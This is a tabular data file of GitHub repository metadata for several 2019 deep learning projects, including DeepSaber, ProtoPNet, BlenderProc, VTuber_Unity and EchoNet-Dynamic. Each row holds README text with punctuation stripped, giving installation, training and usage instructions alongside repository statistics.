oxai,deepsaber,n/a,Google Doc https docs google com document d 1UDSphLiWsrbdr4jliFq8kzrJlUVKpF2asaL65GnnfoM edit Welcome to the readme for DeepSaber an automatic generator of BeatSaber levels There is a lot of stuff here fruit of a lot of work by the team in OxAI Labs http oxai org labs Contact me at guillermo valle at oxai org or on twitter guillefix for any questions suggestions TLDR generation Requirements Dependencies From Pypi using pip numpy librosa pytorch installed as torch or via https pytorch org get started locally pandas matplotlib pillow From your favorite package manager sox http sox sourceforge net e g sudo apt get install sox ffmpeg Reccommended hardware Nvidia GPU with CUDA unfortunately stage 2 is too slow in CPU although it should work in theory after removing cuda options in scritgenerate sh below Do this first time generating Download pre trained weights from https mega nz tJBxTC5C nXspSCKfJ6PYJjdKkFVzIviYEhr0BSg8zXINBqC5rpA and extract the contents two folders with four files in total inside the folder scripts training Then to generate a level simply run if on linux cd scripts generation scriptgenerate sh path to song where you should substitute path to song with the path to the song which you want to use to generate the level which should be on wav format sorry Also it doesn t like spaces in the filename P Generation should take about 3 minutes for a 3 minutes song but it grows I think squared ly with the length and it will depend on how good your GPU is mine is a gtx 1070 This will generate a zip with the Beat Saber level which should be found in scripts generation generated You should be able to put it in the custom levels folders in the current version of DeepSaber as of end of 2019 I also recommending reading about how to use the openinbrowser option described in the next section which is quite a nice feature to visualize the generated quickly and easy to set up if you have dropbox Pro tip If the generated level doesn t look good this is deep learning it s hard to give guarantees P try changing in scriptgenerate sh sh cpt2 2150000 cpt2 1200000 cpt2 1450000 to sh cpt2 2150000 cpt2 1200000 cpt2 1450000 See below for explanation Further generation options TODO make this more user friendly If you open the script scripts generation scriptgenerate sh in your editor you can see other options You can change exp1 and exp2 as well as the corresponding cpt1 and cpt2 These correspond to experiments and checkpoints and determine where to get the pre trained network weights The checkpoints are found in folders inside scripts training and cpt1 cpt2 just specify which of the saved iterations to use If you train your own models you can change those to generate using your trained models You can also change them to explore different pre trained versions available at https mega nz VEo3XAxb 7juvHR6IjG1IvsVn1yGFqFY3sQVuFyvlbbdDPyk4 for example DeepSaber 1 used the latest in blockplacementnewnohumreg for stage 1 and the latest in blockselectionnew but the one you downloaded above is the latest one DeepSaber 2 trained on a more curated dataset so should typically work best but there is always some stochasticity and subjectivity so You can also change the variable type from deepsaber to ddc to use DDC https github com chrisdonahue ddc as the stage 1 where in times to put notes while still using deepsaber for stage 2 which notes to put at each instant for which stage 1 decides to put something But this requires setting up DDC first If you do then just pass the generated stepmania file as a third command argument and it should work the same There is also an open in browser option which is activated by uncommenting the line openinbrowser inside the deepsaber if block which is very useful for testing as it gives you a link with a level visualizer on the broser To set it up you just need to set up the script scripts generation dropboxuploader sh This is very easy just run the script and it will guide you with how to link it to your dropbox account you need one A useful parameter to change also is the peak threshold It is currently set at about 0 33 but you can experiment with it Putting it higher makes it output less notes and putting it lower makes more notes If you dig deeper you can also disable the option usebeamsearch but the outputs are then usually quite random you can also try setting the temperature parameter lower to make it a less so but beam search is typically better Digging even deeper there is a very hidden option P inside scripts generation generatestage2 py in line 59 there opt beamsize 17 You can change this number if you want Making it larger means the generation will take longer but it will typically be of higher quality it s as if the model thinks harder about it and making it smaller has the opposite effect but can be a good thing to try if you want fast generation for some reason You could change opt nbest 1 to something greater than 1 and change some other code to get outputs that model thought less likely and explore what the model can generate contact me for more details Example of whole pipeline Requirements Dependencies numpy librosa pytorch mpi4py only for training dataprocessing This is a quick run through the whole pipeline from getting data to training to generating Run all this in root folder of repo Get example data wget O DataSample tar gz https www dropbox com s 2i75ebqmm5yd15c DataSample tar gz dl 1 Can also download the whole dataset here https mega nz sABVnYYJ ZWImW0OSCDw8Huazxs3Vr0p2jCqmR44IB9DCKWxac tar xzvf DataSample tar gz mv scripts misc bashscripts extractzips sh DataSample cd DataSample extractzips sh rm DataSample zip mv DataSample data extracteddata Get reduced state list wget O data statespace sortedstates pkl https www dropbox com s ygffzawbipvady8 sortedstates pkl dl 1 Data augmentation optional scripts dataprocessing augmentdata sh extract features Dependencies librosa mpi4py and mpi itself TODO make mpi an optional dependency You can change the Expert ExpertPlus with any comma separated and with no spaces list of difficulties to train on levels of those difficulties mpiexec n nproc python3 scripts featureextraction processsongs py data extracteddata Expert ExpertPlus featurename multimel featuresize 80 mpiexec n nproc python3 scripts featureextraction processsongs py data extracteddata Expert ExpertPlus featurename mel featuresize 100 pregenerate level tensors new fix that makes stage 1 training much faster The way this works is that we need to run this command for each difficulty level we want to train on Here Expert and ExpertPlus mpiexec n 12 python3 scripts featureextraction processsongstensors py data DataSample Expert replaceexisting featurename multimel featuresize 80 mpiexec n 12 python3 scripts featureextraction processsongstensors py data DataSample ExpertPlus replaceexisting featurename multimel featuresize 80 training Dependencies pytorch Train Stage 1 Either of two options wavenetoption scripts training debugscriptblockplacement sh ddc option scripts training debugscriptddcblockplacement sh Train Stage 2 scripts training debugscriptblockselection sh generation using the model trained as above To generate with the models trained as above you need to edit scripts generation scriptgenerate sh and change the variable exp1 to the experiment name from which we want to get the trained weights if following the example above it would be either testblockplacement or testddcblockplacement if used ddc change the variable exp2 to testblockselection change cpt1 to the latest block placement iteration and cpt2 to the latest block selection iteration The latest iterations can be found by looking for files in the folders in scripts training with the names of the different experiments have the form iter checkpoint net pth The last argument is the path to a song in wav format scripts generation scriptgenerate sh deepsaber checkpoint1 checkpoint2 path to some song in wav format To use the ddc options or the open in browser option requires more setting up specially the former But the above should generate a zip file with the level The open in browser option is very useful for visualizing the level You just need to set up the script scripts generation dropboxuploader sh This is very easy just run the script and it will guide you with how to link it to your dropbox account you need one The DDC option requires setting up DDC https github com chrisdonahue ddc which now includes a docker component and requires its own series of steps But hopefully the new trained model will supersede this Getting the data TODO Here we describe the scripts to scrap Beastsaver and BeastSaber to get the training data download data scripts dataretrieval downloaddata py obtain the most common states to use for the reduced state representation scripts dataprocessing statespacefunctions py train prepare and preprocess data data augmentation scripts dataprocessing augmentdata sh data preprocessing scripts featureextration processsongs py training scripts training scriptblockplacement sh See more at readme in scripts training README md Minimal Example of Usage python from base options trainoptions import TrainOptions from base data import createdataset createdataloader from base models import createmodel opt TrainOptions parse dataset createdataset opt dataloader createdataloader dataset data dataloader 0 input songs target notes features beatfeatures model createmodel opt for epoch in range opt epochcount opt nepoch opt nepochdecay for i data in enumerate dataloader model setinput data model optimizeparameters if totalsteps opt printfreq 0 losses model getcurrentlosses print losses print f End of epoch i model updatelearningrate Dataset Steps for creating a custom dataset with custom command line options Create a file datasetnamedataset py in the data folder where datasetname is your custom name Import the class BaseDataset from base data basedataset Create a class DatasetNameDataset case does not matter that inherits from BaseDataset Define the getitem and len methods Options are stored in the opt object that is passed to init Create the modify commandline options method to add your custom commandline options e g python staticmethod def modifycommandlineoptions parser istrain parser addargument samplingrate default 22050 type float parser addargument leveldiff default Expert help Difficulty level for beatsaber level parser addargument hoplength default 512 type int Set the hop length at 22050 Hz 512 samples 23ms parser addargument computefeats action storetrue help Whether to extract musical features from the song return parser In this example samplingrate leveldiff hoplength and computefeats are accessible as attributes of the option object Add a name method that returns the name of your class as a string e g python def name self return SongDataset When launching your training script add the command line argument datasetname yourDatasetName See base data songdataset py for an example of a dataset that follows this API Model Steps for creating a custom model with custom command line options Create a file modelnamemodel py in the models folder where modelname is your custom name Import the class BaseModel from base data basemodel Create a class ModelNameModel case does not matter that inherits from BaseDataset Initialize a nn Module instance your pytorch neural network with a forward method and add it to the ModelNameModel instance as an attribute with name modelnamenet Append the module name to the attribute list self modulenames append modelname as a string in init Add a forward method where the loss is computed The name of the loss must be self losslossname Append lossname to the self lossnames list as a string in init Add a backward method where the optimizers are set up gradients are computed on the losses using self losslossname backward and an optimizer step is performed Optimizers cna be stored in the list self optimizers Add an optimizeparameters method where self setrequiresgrad self modelnamenet requiresgrad True self forward and self backward are defined Example python def init self opt super init opt self lossnames crossentropy self metricnames self modulenames wave self imagepaths self schedulers self net WaveNet layers opt layers blocks opt blocks dilationchannels opt dilationchannels residualchannels opt residualchannels skipchannels opt skipchannels endchannels opt endchannels inputchannels opt inputchannels outputlength opt outputlength kernelsize opt kernelsize bias opt bias self optimizers torch optim Adam params param for name param in self net namedparameters if name 4 bias lr 2 opt learningrate bias parameters change quicker no weight decay is applied params param for name param in self net namedparameters if name 4 bias lr opt learningrate weightdecay opt weightdecay filter parameters have weight decay staticmethod def modifycommandlineoptions parser istrain parser addargument layers type int default 10 help Number of layers in each block parser addargument blocks type int default 4 help Number of residual blocks in network parser addargument dilationchannels type int default 32 help Number of channels in dilated convolutions parser addargument residualchannels type int default 32 help Number of channels in the residual link parser addargument skipchannels type int default 256 parser addargument endchannels type int default 256 parser addargument inputchannels type int default 1 parser addargument outputlength type int default 1 parser addargument kernelsize type int default 2 parser addargument bias action storefalse return parser def forward self self output self wavenet forward self input self losscrossentropy F crossentropy self output self target def backward self self optimizers 0 zerograd self losscrossentropy backward self optimizers 0 step def optimizeparameters self self setrequiresgrad self net requiresgrad True self forward self backward for scheduler in self schedulers step for schedulers that update after each iteration try scheduler batchstep except AttributeError pass Create the modify commandline options method to add your custom commandline options e g look above Add a name method that returns the name of your class as a string e g python def name self return WaveNetModel See base models wavenetmodel py for an example of a dataset that follows this API Notes 1 If the output of your dataset is a dictionary data input inputtensor target targettensor you can use model setinput data to store input and target into your model for use in forward 2 Store the nn Module instance in another file e g networks py for better abstraction,2019-09-22T13:21:18Z,2019-12-12T11:01:04Z,Python,oxai,Organization,9,28,1,616,master,guillefix#Arcanewinds#ralphabb#achatrian#mjorgen1#goncaloxyz#furll#timothyseabrook,8,0,0,1,0,0,1
cfchen-duke,ProtoPNet,n/a,This code package implements the prototypical part network ProtoPNet from the paper This Looks Like That Deep Learning for Interpretable Image Recognition to appear at NeurIPS 2019 by Chaofan Chen Duke University Oscar Li Duke University Chaofan Tao Duke University Alina Jade Barnett Duke University Jonathan Su MIT Lincoln Laboratory and Cynthia Rudin Duke University denotes equal contribution This code package was SOLELY developed by the authors at Duke University and licensed under MIT License see LICENSE for more information regarding the use and the distribution of this code package Prerequisites PyTorch NumPy cv2 Augmentor https github com mdbloice Augmentor Recommended hardware 4 NVIDIA Tesla P 100 GPUs or 8 NVIDIA Tesla K 80 GPUs Instructions for preparing the data 1 Download the dataset CUB2002011 tgz from http www vision caltech edu visipedia CUB 200 2011 html 2 Unpack CUB2002011 tgz 3 Crop the images using information from boundingboxes txt included in the dataset 4 Split the cropped images into training and test sets using traintestsplit txt included in the dataset 5 Put the cropped training images in the directory datasets cub200cropped traincropped 6 Put the cropped test images in the directory datasets cub200cropped testcropped 7 Augment the training set using imgaug py included in this code package this will create an augmented training set in the following directory datasets cub200cropped traincroppedaugmented Instructions for training the model 1 In settings py provide the appropriate strings for datapath traindir testdir trainpushdir 1 datapath is where the dataset resides if you followed the instructions for preparing the data datapath should be datasets cub200cropped 2 traindir is the directory containing the augmented training set if you followed the instructions for preparing the data traindir should be datapath traincroppedaugmented 3 testdir is the directory containing the test set if you followed the instructions for preparing the data testdir should be datapath testcropped 4 trainpushdir is the directory containing the original unaugmented training set if you followed the instructions for preparing the data trainpushdir should be datapath traincropped 2 Run main py Instructions for finding the nearest prototypes to a test image 1 Run localanalysis py and supply the following arguments gpuid is the GPU device ID s you want to use optional default 0 modeldir is the directory containing the model you want to analyze model is the filename of the saved model you want to analyze imgdir is the directory containing the image you want to analyze img is the filename of the image you want to analyze imgclass is the 0 based index of the correct class of the image Instructions for finding the nearest patches to each prototype 1 Run globalanalysis py and supply the following arguments gpuid is the GPU device ID s you want to use optional default 0 modeldir is the directory containing the model you want to analyze model is the filename of the saved model you want to analyze Instructions for pruning the prototypes from a saved model 1 Run runpruning py and supply the following arguments gpuid is the GPU device ID s you want to use optional default 0 modeldir is the directory containing the model you want to prune prototypes from model is the filename of the saved model you want to prune prototypes from Note the prototypes in the model must already have been projected pushed onto the nearest latent training patches before running this script Instructions for combining several ProtoPNet models Jupyter Notebook required 1 Run the Jupyter Notebook combinemodels ipynb,2019-09-26T18:23:50Z,2019-12-12T09:23:37Z,Python,cfchen-duke,User,5,28,6,9,master,cfchen-duke,1,0,0,0,0,0,0
kayoyin,GreyClassifier,n/a,GreyClassifier This repository gathers the code for greyscale natural image classification from the in class Kaggle challenge https www kaggle com c cs ioc5008 hw1 Getting started First create a new virtual environment virtualenv venv p python3 source venv bin activate You might need to make sure your python3 link is ready by typing bash which python3 Then install the development requirements bash pip install r requirements txt Install pretrained weights bash sh installtools sh Training the base classifiers Training configuration can be specified in src configs py To train a model for a specific subclass simply uncomment the desired SUBCLASS in this file and change LOGGER to rooms nature or urban If you would like to train on single channel images you can set GREY True Then run python m src run This will train the CNN model on the training and validation sets then generate and save the concatenated outputs of the snapshot models in xgbdata Training the XGB meta learners Make sure that LOGGER in src configs py is set to the same one you used to train your base classifier and that TRAIN True Run python m src ensemble This will train and save the XGBoost model weights Ensemble prediction First set TRAIN False in src configs py Run python m src ensemble This will save the testing predictions under xgb csv Future work Add argument parsing so that the user does not have to edit the configuration file for each different run and parameters can be passed as arguments instead,2019-10-17T13:37:16Z,2019-12-12T11:10:10Z,Python,kayoyin,User,3,25,5,1,master,kayoyin,1,0,0,0,0,0,0
DLR-RM,BlenderProc,blender-installation#blender-pipeline#camera-positions#camera-sampling#depth-images#segmentation#suncg-scene,BlenderProc A procedural blender pipeline to generate images for deep learning The corresponding arxiv paper https arxiv org abs 1911 01911 General In general one run of the pipeline first loads or constructs a 3D scene then sets some camera positions inside this scene and in the end renders different types of image rgb depth normals etc for each of them The blender pipeline consists of different modules each of them performing one step in the described process The modules are selected ordered and configured via a yaml file To run the blender pipeline one just has to call the run py script in the main directory together with the desired config file python run py config yaml This will now run all modules specified in the config file step by step in the configured order The following modules are already implemented and ready to use Load obj files and SunCG scenes Automatic lighting of SunCG scenes Loading camera positions from file Sampling camera positions inside SunCG rooms Rendering of rgb depth normal and segmentation images Merging data into hdf5 files For advanced usage which is not covered by these modules own modules can easily be implemented see Writing modules writing modules Examples Basic scene examples basic A small example loading an obj file and camera positions before rendering normal and color images Simple SUNCG scene examples suncgbasic Loads a suncg scene and camera positions from file before rendering color normal segmentation and a depth images SUNCG scene with camera sampling examples suncgwithcamsampling Loads a suncg scene and automatically samples camera poses in every room before rendering color normal segmentation and a depth images Config A very small config file could look like this yaml setup blenderinstallpath homelocal blender blenderversion blender 2 80 linux glibc217 x8664 pip h5py global all outputdir renderer pixelaspectx 1 333333333 modules name renderer NormalRenderer config samples 255 To prevent the hardcoding of e q paths placeholder are allowed inside the configuration placeholder replacement Is replaced by the ith argument given to the run py script not including the path of the config file The numbering starts from zero Is replaced by the value of the environment variable with name NAME Setup When starting the pipeline the blender version and python packages required for the given config are automatically installed Such software related options are specified inside the setup section of a config property description blenderversion Specifies the exact blender version identifier which should be installed and used for running the pipeline Look at https download blender org release to find the corresponding identifier to a specific version blenderinstallpath The directory where blender should be installed Default blender customblenderpath If you want to use an existing blender installation you can set this option to the main directory of your blender installation which will then be used for running the blender pipeline Therefore automatic blender installation is disabled and the options blenderinstallpath and blenderversion are ignored pip A list of python packages which are required to run the configured pipeline They are automatically installed inside the blender python environment via pip install Modules The section modules consists of a list of dict objects which all specify a module Every of these module specifications has the following properties property description name Specifies the module class to use Here the name is just its python path starting from inside the src directory config Contains the module configuration used to customize the action performed by the module The modules are executed in the exact same order as they are configured inside the modules section Global This section contains configuration parameters that are relevant for multiple or all modules The configuration specified inside all is inherited by all modules while the config specified inside e q renderer is inherited by all modules with the prefix e q renderer NormalRenderer Writing modules A module is a class executing one step in the pipeline Here is the basic structure of such a module python from src main Module import Module class CameraLoader Module def init self config Module init self config def run self The constructor of all modules is called before running any module also in the order specified in the config file Nevertheless it should only be used for small preparation work while most of the module s work should be done inside run Access configuration The module s configuration can be accessed via self config This configuration object has the methods getint getfloat getbool getstring getlist getrawdict each working in the same way The first parameter specifies the key name of the parameter to get By using it is also possible access values nested inside additional dicts see example below The second parameter specifies the default value which is returned if the requested parameter has not been specified inside the config file If None is given an error is thrown instead Example Config file yaml global all outputdir tmp autotilesize false renderer pixelaspectx 1 333333333 modules name renderer NormalRenderer config autotilesize true cycles samples 255 Inside the renderer NormalRenderer module python self getint cycles samples 42 255 self getfloat pixelaspectx 1 333333333 self getstring outputdir output tmp self getbool autotilesize True self config getint resolutionx 512 512 self config getint tilex throws an error Undo changes In some modules it makes sense to revert changes made inside the module to not disturb modules coming afterwards For example renderer modules should not change the state of the scene This often requried funcitonality can be easily done via the Utility UndoAfterExecution with statement Example python def run self bpy context scene cycles samples 50 with Utility UndoAfterExecution bpy context scene cycles samples 320 print bpy context scene cycles samples Outputs 320 print bpy context scene cycles samples Outputs 50 All changes inside the with block are undone which could also be undone via CTRL Z inside blender Between module communication To exchange information between modules the blender s custom properties are used Blender allows to assign arbitrary information to scenes and objects So modules can read out custom properties set by earlier modules and change their behaviour accordingly Example The module loader SuncgLoader adds the custom property categoryid to every object The module renderer SegMapRenderer reads out this property and sets the segmentation color of every object correspondingly In this way the renderer SegMapRenderer can also be used without using the loader SuncgLoader The loader used instead just has to also set the categoryid,2019-10-10T11:29:14Z,2019-12-12T17:58:49Z,Python,DLR-RM,Organization,6,23,3,252,master,DenningerMaximilian#domin1101#themasterlink#MartinSmeyer,4,0,0,0,3,0,0
aneesahmed,piaic-datascience-teaching,n/a,,2019-09-28T17:20:39Z,2019-12-09T22:04:55Z,Jupyter Notebook,aneesahmed,User,8,20,65,22,master,aneesahmed,1,0,0,0,0,0,0
deepkit,deepkit,n/a,Deepkit is currently in alpha version and can be tested on macOS and Linux x64 Releases are available here https github com deepkit deepkit releases If you need help got feedback or any questions please join our Slack channel Join Deepkit community https join slack com t deepkitcommunity sharedinvite enQtODA5MTE0NDg5NDExLTkyZjBkZTZkYjRjZWZjMTFjYjcwNmZhZDFiNTliOWUxZmFjZWE1Y2RmNDBhNmI3MTM5NmFkZDg2YzBiNTZlNDc Please see the Wiki https github com deepkit deepkit wiki for more informmation especially on how to get started https github com deepkit deepkit wiki Get started Alpha The goal of this alpha version is Test compatiblity with various OS versions environments Find bugs and performance issues Gather feedback on how the app UX feels Please provide feedback to our email info deepkit ai or in our Slack channel https join slack com t deepkitcommunity sharedinvite enQtODA5MTE0NDg5NDExLTkyZjBkZTZkYjRjZWZjMTFjYjcwNmZhZDFiNTliOWUxZmFjZWE1Y2RmNDBhNmI3MTM5NmFkZDg2YzBiNTZlNDc License Agreement THE SOFTWARE IS PROVIDED AS IS WITHOUT WARRANTY OF ANY KIND EXPRESS OR IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE Copyright Deepkit UG Beta Beta version will follow in the next weeks and will include the debugger and Deepkit team server Windows Windows is not yet supported,2019-09-20T11:20:37Z,2019-12-05T18:10:07Z,n/a,deepkit,Organization,5,20,1,9,master,marcj,1,4,5,4,2,0,0
xingyul,meteornet,n/a,MeteorNet Deep Learning on Dynamic 3D Point Cloud Sequences Created by Xingyu Liu Mengyuan Yan and Jeannette Bohg from Stanford University arXiv https arxiv org abs 1910 09165 project https sites google com view meteornet Code The code will be released soon Hopefully before mid December Citation If you find this work useful in your research please cite inproceedingsliu2019meteornet title MeteorNet Deep Learning on Dynamic 3D Point Cloud Sequences author Xingyu Liu and Mengyuan Yan and Jeannette Bohg booktitle ICCV year 2019,2019-10-30T11:47:11Z,2019-12-11T04:40:58Z,n/a,xingyul,User,6,19,0,1,master,xingyul,1,0,0,2,0,0,0
IouJenLiu,PIC,n/a,PIC Permutation Invariant Critic for Multi Agent Deep Reinforcement Learning CORL 2019 Project Website http www isle illinois edu yeh17 projects invariantcritic index html PDF https arxiv org pdf 1911 00025 pdf Iou Jen Liu ast Raymond A Yeh http www isle illinois edu yeh17 index html ast Alexander G Schwing http www alexander schwing de University of Illinois at Urbana Champaign indicates equal contribution The repository contains Pytorch implementation of MADDPG with Permutation Invariant Critic PIC If you used this code for your experiments or found it helpful please consider citing the following paper inproceedingsLiuCORL2019 author I J Liu ast and R A Yeh ast and A G Schwing title PIC Permutation Invariant Critic for Multi Agent Deep Reinforcement Learning booktitle Proc CORL year 2019 note ast equal contribution Platform and Dependencies Ubuntu 16 04 Python 3 7 Pytorch 1 1 0 OpenAI gym 0 10 9 https github com openai gym Install the improved MPE cd multiagent particle envs pip install e Please ensure that multiagent particle envs has been added to your PYTHONPATH Training cd maddpg python mainvec py expname coopnavigationn6 scenario simplespreadn6 critictype gcnmax cuda Acknowledgement The MADDPG code is based on the DDPG implementation of https github com ikostrikov pytorch ddpg naf The improved MPE code is based on the MPE implementation of https github com openai multiagent particle envs The GCN code is based on the implementation of https github com tkipf gcn License PIC is licensed under the MIT License,2019-10-03T22:58:40Z,2019-12-01T12:00:54Z,Python,IouJenLiu,User,3,15,3,24,master,IouJenLiu#raymondyeh07,2,0,0,1,0,0,0
kwea123,VTuber_Unity,dlib#face-detection#face-landmark-detection#face-pose#gaze-estimation#python#pytorch#unity#unity-chan#vrm#vtuber,VTuberUnity Use Unity 3D character and Python deep learning algorithms to stream as a VTuber This is part of the OpenVTuberProject https github com kwea123 OpenVTuberProject which provides many toolkits for becoming a VTuber Youtube Playlist Chinese Covers videos 1 4 teaser images teaser jpg https www youtube com playlist list PLDV2CyUo4q JFGrpG595jMdWZLwYOnu4p Credits First of all I d like to give credits to the following projects that I borrow code from Project LICENSE head pose estimation https github com yinguobing head pose estimation LICENSE licenses LICENSE head pose estimation face alignment https github com 1adrianb face alignment LICENSE licenses LICENSE face alignment GazeTracking https github com antoinelame GazeTracking LICENSE licenses LICENSE GazeTracking And the virtual character unity chan http unity chan com UTJ UCL Installation Hardware OS Ubuntu 16 04 18 04 may also work or Windows 10 64bits Optional but recommended An NVIDIA GPU tested with CUDA 9 0 10 0 and 10 1 but may also work with other versions Software Python3 x installation via Anaconda https www anaconda com distribution is recommended mandatory for Windows users Optional It is recommended to use conda environments Run conda create n vtuber python 3 6 Activate it by conda activate vtuber Python libraries Ubuntu Install the requirements by pip install r requirements cpu or gpu txt If you have CUDA 10 1 pip install onnxruntime gpu to get faster inference speed using onnx model Windows CPU pip install r requirementscpu txt if dlib https github com davisking dlib cannot be properly installed follow here https github com kwea123 VTuberUnity wiki Dlib installation on Windows GPU Install pytorch https pytorch org using conda Example conda install pytorch 1 2 0 torchvision 0 4 0 cudatoolkit 10 0 c pytorch Install other dependencies by pip install r requirementsgpu txt If you have CUDA 10 pip install onnxruntime gpu to get faster inference speed using onnx model Optional OBS Studio https obsproject com if you want to embed the virtual character into your videos Unity Editor if you want to customize the virtual character Linux installation https forum unity com threads unity on linux release notes and known issues 350256 Windows installation https unity3d com get unity download Example usage Here we assume that you have installed the requirements and activated the virtual environment you are using 0 Model download You need to download the models here https github com kwea123 VTuberUnity releases tag v1 0 extract and put into facealignment ckpts If you don t use onnxruntime you can omit this step as the script will automatically download them for you 1 Face detection test Run python demo py debug add cpu if you have CPU only You should see the following Left CPU model Right GPU model run on a GTX1080Ti 2 Synchronize with the virtual character 1 Download and launch the binaries here https github com kwea123 VTuberUnity releases depending on your OS to launch the unity window featuring the virtual character unity chan here Important Ensure that only one window is opened at a time 2 After the vitual character shows up run python demo py connect to synchronize your face features with the virtual character add debug to see your face and cpu if you have CPU only as step 1 You should see the following Left CPU model Right GPU model run on a GTX1080Ti Enjoy your VTuber life Functionalities details In this section I will describe the functionalities implemented and a little about the technology behind Head pose estimation Using head pose estimation https github com yinguobing head pose estimation and face alignment https github com 1adrianb face alignment deep learning methods are applied to do the following face detection and facial landmark detection A face bounding box and the 68 point facial landmark is detected then a PnP algorithm is used to obtain the head pose the rotation of the face Finally kalman filters are applied to the pose to make it smoother The character s head pose is synchronized As for the visualization the white bounding box is the detected face on top of which 68 green face landmarks are plotted The head pose is represented by the green frustum and the axes in front of the nose Gaze estimation Using GazeTracking https github com antoinelame GazeTracking The eyes are first extracted using the landmarks enclosing the eyes Then the eye images are converted to grayscale and a pixel intensity threshold is applied to detect the iris the black part of the eye Finally the center of the iris is computed as the center of the black area The character s gaze is not synchronized Since I didn t find a way to move unity chan s eyes As for the visualization the red crosses indicate the iris Miscellaneous 1 Estimate eye aspect ratio https www google com search q eye aspect ratio rlz 1C1GCEUjaJP829JP829 oq eye aqs chrome 0 69i59j69i57j69i65j69i61 846j0j7 sourceid chrome ie UTF 8 The eye aspect ratio can be used to detect blinking but currently I just use auto blinking since this estimation is not so accurate 2 Estimate mouth aspect ratio https www google com search rlz 1C1GCEUjaJP829JP829 sxsrf ACYBGNR1ME HV3c5avZ15yahkkQd1omjpw 3A1571114646809 ei lk6lXcyIMZ Rr7wP0OCX8A4 q mouth aspect ratio oq mouth aspect ratio gsl psy ab 3 35i39j0i203 30193 31394 31535 0 0 0 109 710 4j3 0 1 gws wiz 0i7i30j0i8i30j0i10i30j0i7i10i30j0i8i7i30j0i13j0i13i30j0i13i5i30 IWlXGoyW5GE ved 0ahUKEwjMq7KTup3lAhWfyIsBHVDwBe4Q4dUDCAs uact 5 I use this number to synchronize with the character s mouth 3 The mouth distance is used to detect smile and synchronize with the character Unity Project If you want to customize the virtual character you can find the unity project in release https github com kwea123 VTuberUnity releases License MIT License LICENSE,2019-10-14T11:23:56Z,2019-12-05T10:07:07Z,Python,kwea123,User,1,15,2,89,master,kwea123,1,1,2,0,0,0,1
douyang,EchoNetDynamic,n/a,EchoNet Dynamic Interpretable AI for beat to beat cardiac function assessment EchoNet Dynamic is a end to end beat to beat deep learning model for 1 semantic segmentation of the left ventricle 2 prediction of ejection fraction by entire video or subsampled clips and 3 assessment of cardiomyopathy with reduced ejection fraction For more details see the acompanying paper Interpretable AI for beat to beat cardiac function assessment https www medrxiv org content 10 1101 19012419v2 by David Ouyang Bryan He Amirata Ghorbani Curt P Langlotz Paul A Heidenreich Robert A Harrington David H Liang Euan A Ashley and James Y Zou Dataset We share a deidentified set of 10 000 echocardiogram images which were used for training EchoNet Dynamic Preprocessing of these images including deidentification and conversion from DICOM format to AVI format videos were performed with OpenCV and pydicom Additional information is at https douyang github io EchoNetDynamic These deidentified images are shared with a non commerical data use agreement Examples We show examples of our semantic segmentation for nine distinct patients below Three patients have normal cardiac function three have low ejection fractions and three have arrhythmia No human tracings for these patients were used by EchoNet Dynamic Normal Low Ejection Fraction Arrhythmia docs media 0X10A28877E97DF540 gif docs media 0X129133A90A61A59D gif docs media 0X132C1E8DBB715D1D gif docs media 0X1167650B8BEFF863 gif docs media 0X13CE2039E2D706A gif docs media 0X18BA5512BE5D6FFA gif docs media 0X148FFCBF4D0C398F gif docs media 0X16FC9AA0AD5D8136 gif docs media 0X1E12EEE43FD913E5 gif Installation First clone this repository and enter the directory by running git clone https github com douyang EchoNetDynamic cd EchoNetDynamic EchoNet Dynamic is implemented for Python 3 and depends on the following packages NumPy PyTorch Torchvision OpenCV skimage sklearn tqdm Echonet Dynamic and its dependencies can be installed by navigating to the cloned directory and running pip install user Usage Preprocessing DICOM Videos The input of EchoNet Dynamic is an apical 4 chamber view echocardiogram video of any length The easiest way to run our code is to use videos from our dataset but we also provide a Jupyter Notebook ConvertDICOMToAVI ipynb to convert DICOM files to AVI files used for input to EchoNet Dynamic The Notebook deidentifies the video by cropping out information outside of the ultrasound sector resizes the input video and saves the video in AVI format Setting Path to Data By default EchoNet Dynamic assumes that a copy of the data is saved in a folder named a4c video dir in this directory This path can be changed by creating a configuration file named echonet cfg an example configuration file is example cfg Running Code EchoNet Dynamic has three main components segmenting the left ventricle predicting ejection fraction from subsampled clips and assessing cardiomyopathy with beat by beat predictions Each of these components can be run with reasonable choices of hyperparameters with the scripts below We describe our full hyperparameter sweep in the next section Frame by frame Semantic Segmentation of the Left Ventricle cmd import echonet echonet utils segmentation run modelname deeplabv3resnet50 savesegmentation True pretrained False python3 c cmd This creates a directory named output segmentation deeplabv3resnet50random which will contain log csv training and validation losses best pt checkpoint of weights for the model with the lowest validation loss size csv estimated size of left ventricle for each frame and indicator for beginning of beat videos directory containing videos with segmentation overlay Prediction of Ejection Fraction from Subsampled Clips cmd import echonet echonet utils video run modelname r2plus1d18 frames 32 period 2 pretrained True batchsize 8 python3 c cmd This creates a directory named output video r2plus1d18322pretrained which will contain log csv training and validation losses best pt checkpoint of weights for the model with the lowest validation loss testpredictions csv ejection fraction prediction for subsampled clips Beat by beat Prediction of Ejection Fraction from Full Video and Assesment of Cardiomyopathy The final beat by beat prediction and analysis is performed with scripts beatanalysis R This script combines the results from segmentation output in size csv and the clip level ejection fraction prediction in testpredictions csv The beginning of each systolic phase is detected by using the peak detection algorithm from scipy scipy signal findpeaks and a video clip centered around the beat is used for beat by beat prediction Hyperparameter Sweeps The full set of hyperparameter sweeps from the paper can be run via runexperiments sh In particular we choose between pretrained and random initialization for the weights the model selected from r2plus1d18 r3d18 and mc318 the length of the video 1 4 8 16 32 64 and 96 frames and the sampling period 1 2 4 6 and 8 frames,2019-09-25T19:00:44Z,2019-12-13T22:28:21Z,Python,douyang,User,3,15,1,117,master,douyang#bryanhe,2,1,1,0,0,0,1
